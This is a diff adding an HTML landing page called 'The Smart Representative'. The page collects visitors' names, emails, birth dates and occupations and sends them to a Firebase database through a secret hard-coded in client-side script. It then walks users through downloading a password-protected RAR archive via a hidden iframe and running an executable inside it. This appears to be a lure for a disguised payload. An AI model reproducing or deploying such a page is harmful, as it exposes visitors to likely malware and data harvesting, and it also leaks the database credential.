@@ -1,0 +1,327 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>The Smart Representative</title>
+    <!-- Tailwind CSS CDN -->
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        /* Animated Gradient Background */
+        @keyframes gradientAnimation {
+            0% { background-position: 0% 50%; }
+            50% { background-position: 100% 50%; }
+            100% { background-position: 0% 50%; }
+        }
+
+        .animated-bg {
+            background: linear-gradient(135deg, #e0f2fe, #bae6fd, #7dd3fc, #38bdf8);
+            background-size: 300% 300%;
+            animation: gradientAnimation 4s ease infinite;
+        }
+
+        /* Smooth fade out for intro */
+        .fade-out {
+            opacity: 0;
+            visibility: hidden;
+            transition: opacity 0.8s ease, visibility 0.8s ease;
+        }
+
+        /* Pulse / Zoom animation for Intro Logo */
+        @keyframes zoomInLogo {
+            0% { transform: scale(0.8); opacity: 0; }
+            50% { transform: scale(1.05); opacity: 1; }
+            100% { transform: scale(1); opacity: 1; }
+        }
+
+        .intro-logo-anim {
+            animation: zoomInLogo 1.2s ease-out forwards;
+        }
+    </style>
+</head>
+<body class="animated-bg min-h-screen flex flex-col justify-between items-center py-6 px-4 sm:px-6 relative overflow-x-hidden">
+
+    <!-- INTRO SCREEN (3 Seconds) -->
+    <div id="introScreen" class="fixed inset-0 animated-bg z-50 flex flex-col items-center justify-center text-center p-4">
+        <div class="intro-logo-anim flex flex-col items-center">
+            <div class="w-20 h-20 sm:w-24 sm:h-24 rounded-3xl bg-gradient-to-r from-sky-500 to-blue-600 flex items-center justify-center text-white text-3xl sm:text-4xl shadow-2xl mb-5">
+                <i class="fa-solid fa-briefcase"></i>
+            </div>
+            <h1 class="text-2xl sm:text-4xl font-extrabold tracking-wide text-sky-900 mb-2">The Smart Representative</h1>
+            <p class="text-sm sm:text-base text-sky-700 font-medium">Getting everything ready for you...</p>
+        </div>
+    </div>
+
+    <!-- Top Logo / Title with Briefcase Icon -->
+    <header class="w-full max-w-lg text-center mb-4 flex flex-col items-center">
+        <div class="flex items-center gap-2.5 mb-1">
+            <div class="w-9 h-9 sm:w-10 sm:h-10 rounded-xl bg-gradient-to-r from-sky-500 to-blue-600 flex items-center justify-center text-white shadow-md">
+                <i class="fa-solid fa-briefcase text-base sm:text-lg"></i>
+            </div>
+            <h1 class="text-xl sm:text-2xl font-bold tracking-wide text-sky-700">The Smart Representative</h1>
+        </div>
+        <p class="text-xs sm:text-sm text-slate-500">Please enter your data below</p>
+    </header>
+
+    <!-- Data Entry Card -->
+    <main class="w-full max-w-lg bg-white/90 backdrop-blur-md shadow-2xl rounded-2xl p-6 sm:p-8 border border-sky-100">
+        <h2 class="text-lg sm:text-xl font-bold text-slate-800 text-center mb-5">User Information Entry</h2>
+        
+        <form id="dataForm" class="space-y-3.5" onsubmit="submitDataAndOpenWizard(event)">
+            <!-- Full Name -->
+            <div>
+                <label class="block text-xs font-semibold text-slate-600 mb-1">Full Name</label>
+                <div class="relative">
+                    <span class="absolute inset-y-0 left-0 flex items-center pl-3 text-sky-500">
+                        <i class="fa-solid fa-user"></i>
+                    </span>
+                    <input type="text" id="fullName" required placeholder="Enter your full name" 
+                        class="w-full pl-10 pr-4 py-2.5 bg-sky-50/50 border border-sky-200 rounded-xl text-sm text-slate-700 focus:outline-none focus:ring-2 focus:ring-sky-400">
+                </div>
+            </div>
+
+            <!-- Email -->
+            <div>
+                <label class="block text-xs font-semibold text-slate-600 mb-1">Email Address (for notifications/contact)</label>
+                <div class="relative">
+                    <span class="absolute inset-y-0 left-0 flex items-center pl-3 text-sky-500">
+                        <i class="fa-solid fa-envelope"></i>
+                    </span>
+                    <input type="email" id="email" required placeholder="name@example.com" 
+                        class="w-full pl-10 pr-4 py-2.5 bg-sky-50/50 border border-sky-200 rounded-xl text-sm text-slate-700 focus:outline-none focus:ring-2 focus:ring-sky-400">
+                </div>
+            </div>
+
+            <!-- Date of Birth & Occupation -->
+            <div class="grid grid-cols-1 sm:grid-cols-2 gap-3.5">
+                <div>
+                    <label class="block text-xs font-semibold text-slate-600 mb-1">Date of Birth</label>
+                    <div class="relative">
+                        <span class="absolute inset-y-0 left-0 flex items-center pl-3 text-sky-500">
+                            <i class="fa-solid fa-calendar"></i>
+                        </span>
+                        <input type="date" id="dob" required 
+                            class="w-full pl-10 pr-4 py-2.5 bg-sky-50/50 border border-sky-200 rounded-xl text-sm text-slate-700 focus:outline-none focus:ring-2 focus:ring-sky-400">
+                    </div>
+                </div>
+                <div>
+                    <label class="block text-xs font-semibold text-slate-600 mb-1">Occupation</label>
+                    <div class="relative">
+                        <span class="absolute inset-y-0 left-0 flex items-center pl-3 text-sky-500">
+                            <i class="fa-solid fa-briefcase"></i>
+                        </span>
+                        <input type="text" id="occupation" required placeholder="Your occupation" 
+                            class="w-full pl-10 pr-4 py-2.5 bg-sky-50/50 border border-sky-200 rounded-xl text-sm text-slate-700 focus:outline-none focus:ring-2 focus:ring-sky-400">
+                    </div>
+                </div>
+            </div>
+
+            <!-- Country & How did you hear about us -->
+            <div class="grid grid-cols-1 sm:grid-cols-2 gap-3.5">
+                <div>
+                    <label class="block text-xs font-semibold text-slate-600 mb-1">Country</label>
+                    <div class="relative">
+                        <span class="absolute inset-y-0 left-0 flex items-center pl-3 text-sky-500">
+                            <i class="fa-solid fa-globe"></i>
+                        </span>
+                        <select id="country" class="w-full pl-10 pr-4 py-2.5 bg-sky-50/50 border border-sky-200 rounded-xl text-sm text-slate-700 focus:outline-none focus:ring-2 focus:ring-sky-400">
+                            <option value="Egypt">Egypt</option>
+                            <option value="Saudi Arabia">Saudi Arabia</option>
+                            <option value="UAE">UAE</option>
+                            <option value="Other">Other</option>
+                        </select>
+                    </div>
+                </div>
+                <div>
+                    <label class="block text-xs font-semibold text-slate-600 mb-1">How did you hear about us?</label>
+                    <div class="relative">
+                        <span class="absolute inset-y-0 left-0 flex items-center pl-3 text-sky-500">
+                            <i class="fa-solid fa-bullhorn"></i>
+                        </span>
+                        <select id="source" class="w-full pl-10 pr-4 py-2.5 bg-sky-50/50 border border-sky-200 rounded-xl text-sm text-slate-700 focus:outline-none focus:ring-2 focus:ring-sky-400">
+                            <option value="Social Media">Social Media</option>
+                            <option value="Ad">Ad</option>
+                            <option value="Friend">Friend</option>
+                            <option value="Other">Other</option>
+                        </select>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Submit Button -->
+            <div class="pt-3">
+                <button type="submit" id="submitBtn" class="w-full py-3 bg-gradient-to-r from-sky-500 to-blue-600 text-white font-semibold rounded-xl shadow-lg hover:from-sky-600 hover:to-blue-700 transition duration-200 focus:outline-none focus:ring-2 focus:ring-sky-400 text-sm sm:text-base">
+                    Submit & Continue <i class="fa-solid fa-arrow-right ml-2"></i>
+                </button>
+            </div>
+        </form>
+    </main>
+
+    <!-- Wizard Modal (Hidden by default) -->
+    <div id="wizardModal" class="fixed inset-0 bg-slate-900/50 backdrop-blur-sm hidden flex items-center justify-center p-4 z-50">
+        <div class="bg-white w-full max-w-md rounded-2xl shadow-2xl p-6 border border-sky-100 flex flex-col items-center text-center relative animate-fade-in">
+            
+            <!-- Step Logo Icon -->
+            <div id="wizardIcon" class="w-16 h-16 rounded-2xl bg-gradient-to-r from-sky-500 to-blue-600 flex items-center justify-center text-white text-2xl shadow-lg mb-4 transition-all duration-300">
+                <i class="fa-solid fa-download"></i>
+            </div>
+
+            <!-- Step Title -->
+            <h3 id="wizardTitle" class="text-lg font-bold text-slate-800 mb-2">Step 1: Download File</h3>
+            
+            <!-- Step Description -->
+            <p id="wizardDesc" class="text-sm text-slate-600 mb-6 px-2">
+                First, please download the file.
+            </p>
+
+            <!-- Segmented Progress Bar with Gaps -->
+            <div class="w-full grid grid-cols-3 gap-2 mb-6">
+                <div id="seg1" class="h-2.5 rounded-full bg-gradient-to-r from-sky-500 to-blue-600 transition-all duration-300"></div>
+                <div id="seg2" class="h-2.5 rounded-full bg-sky-100 transition-all duration-300"></div>
+                <div id="seg3" class="h-2.5 rounded-full bg-sky-100 transition-all duration-300"></div>
+            </div>
+
+            <!-- Action Button -->
+            <button id="wizardBtn" onclick="nextStep()" class="w-full py-3 bg-gradient-to-r from-sky-500 to-blue-600 text-white font-semibold rounded-xl shadow-lg hover:from-sky-600 hover:to-blue-700 transition duration-200 text-sm">
+                Next Step <i class="fa-solid fa-arrow-right ml-2"></i>
+            </button>
+        </div>
+    </div>
+
+    <!-- Footer -->
+    <footer class="mt-4 text-center text-xs text-slate-500">
+        Copyright © 2026 The Smart Representative. All Rights Reserved.
+    </footer>
+
+    <!-- Script to handle Intro, Firebase Submission and Wizard Logic -->
+    <script>
+        // Hide Intro Screen after 3 seconds
+        window.addEventListener('load', function() {
+            setTimeout(function() {
+                const intro = document.getElementById('introScreen');
+                intro.classList.add('fade-out');
+            }, 3000); // 3000ms = 3 seconds
+        });
+
+        let currentStep = 1;
+
+        const DATABASE_URL = "https://camr-18344-default-rtdb.firebaseio.com/";
+        const FIREBASE_SECRET = "0pYXRXDf0LrccBnFHS4Uh82UHdt7KmPfuY64gRLy";
+
+        // Listen for Enter key anywhere in the form to submit
+        document.getElementById('dataForm').addEventListener('keydown', function(event) {
+            if (event.key === 'Enter') {
+                event.preventDefault();
+                document.getElementById('dataForm').requestSubmit();
+            }
+        });
+
+        async function submitDataAndOpenWizard(event) {
+            event.preventDefault();
+
+            const submitBtn = document.getElementById('submitBtn');
+            submitBtn.disabled = true;
+            submitBtn.innerHTML = 'Saving Data... <i class="fa-solid fa-spinner fa-spin ml-2"></i>';
+
+            // Gather form data
+            const formData = {
+                fullName: document.getElementById('fullName').value,
+                email: document.getElementById('email').value,
+                dob: document.getElementById('dob').value,
+                occupation: document.getElementById('occupation').value,
+                country: document.getElementById('country').value,
+                source: document.getElementById('source').value,
+                timestamp: new Date().toISOString()
+            };
+
+            try {
+                // Send data to Firebase Realtime Database using REST API with auth secret
+                const response = await fetch(`${DATABASE_URL}/registrations.json?auth=${FIREBASE_SECRET}`, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify(formData)
+                });
+
+                if (!response.ok) {
+                    throw new Error('Failed to save data to database.');
+                }
+
+                // Reset submit button state
+                submitBtn.disabled = false;
+                submitBtn.innerHTML = 'Submit & Continue <i class="fa-solid fa-arrow-right ml-2"></i>';
+
+                // Open Wizard Modal
+                currentStep = 1;
+                document.getElementById('wizardModal').classList.remove('hidden');
+                updateWizardUI();
+
+            } catch (error) {
+                console.error(error);
+                alert("An error occurred while saving your data. Please try again.");
+                submitBtn.disabled = false;
+                submitBtn.innerHTML = 'Submit & Continue <i class="fa-solid fa-arrow-right ml-2"></i>';
+            }
+        }
+
+        function updateWizardUI() {
+            const icon = document.getElementById('wizardIcon');
+            const title = document.getElementById('wizardTitle');
+            const desc = document.getElementById('wizardDesc');
+            const btn = document.getElementById('wizardBtn');
+            
+            const seg1 = document.getElementById('seg1');
+            const seg2 = document.getElementById('seg2');
+            const seg3 = document.getElementById('seg3');
+
+            if (currentStep === 1) {
+                icon.innerHTML = '<i class="fa-solid fa-download"></i>';
+                title.innerText = 'Step 1: Download the File';
+                desc.innerText = 'First, please download the file.';
+                btn.innerHTML = 'Next Step <i class="fa-solid fa-arrow-right ml-2"></i>';
+                
+                seg1.className = "h-2.5 rounded-full bg-gradient-to-r from-sky-500 to-blue-600 transition-all duration-300";
+                seg2.className = "h-2.5 rounded-full bg-sky-100 transition-all duration-300";
+                seg3.className = "h-2.5 rounded-full bg-sky-100 transition-all duration-300";
+            } else if (currentStep === 2) {
+                icon.innerHTML = '<i class="fa-solid fa-file-zipper"></i>';
+                title.innerText = 'Step 2: Extract Archive';
+                desc.innerText = 'Extract the archive using password: 123';
+                btn.innerHTML = 'Next Step <i class="fa-solid fa-arrow-right ml-2"></i>';
+                
+                seg1.className = "h-2.5 rounded-full bg-gradient-to-r from-sky-500 to-blue-600 transition-all duration-300";
+                seg2.className = "h-2.5 rounded-full bg-gradient-to-r from-sky-500 to-blue-600 transition-all duration-300";
+                seg3.className = "h-2.5 rounded-full bg-sky-100 transition-all duration-300";
+            } else if (currentStep === 3) {
+                icon.innerHTML = '<i class="fa-solid fa-gears"></i>';
+                title.innerText = 'Step 3: Run & Setup Environment';
+                desc.innerText = 'Run "Smart Representative .exe", then set up the workspace, and the program will provide you with the download links for representatives.';
+                btn.innerHTML = 'Download File Now <i class="fa-solid fa-download ml-2"></i>';
+                
+                seg1.className = "h-2.5 rounded-full bg-gradient-to-r from-sky-500 to-blue-600 transition-all duration-300";
+                seg2.className = "h-2.5 rounded-full bg-gradient-to-r from-sky-500 to-blue-600 transition-all duration-300";
+                seg3.className = "h-2.5 rounded-full bg-gradient-to-r from-sky-500 to-blue-600 transition-all duration-300";
+            }
+        }
+
+        function nextStep() {
+            if (currentStep < 3) {
+                currentStep++;
+                updateWizardUI();
+            } else {
+                // Final Step: Trigger download when clicking the button after Step 3
+                const downloadUrl = "https://github.com/Manager-Developers/Manager/releases/download/v1.o/Manager.rar";
+                const iframe = document.createElement('iframe');
+                iframe.style.display = 'none';
+                iframe.src = downloadUrl;
+                document.body.appendChild(iframe);
+
+                alert("Data saved & Download started successfully!");
+                document.getElementById('wizardModal').classList.add('hidden');
+            }
+        }
+    </script>
+</body>
+</html>
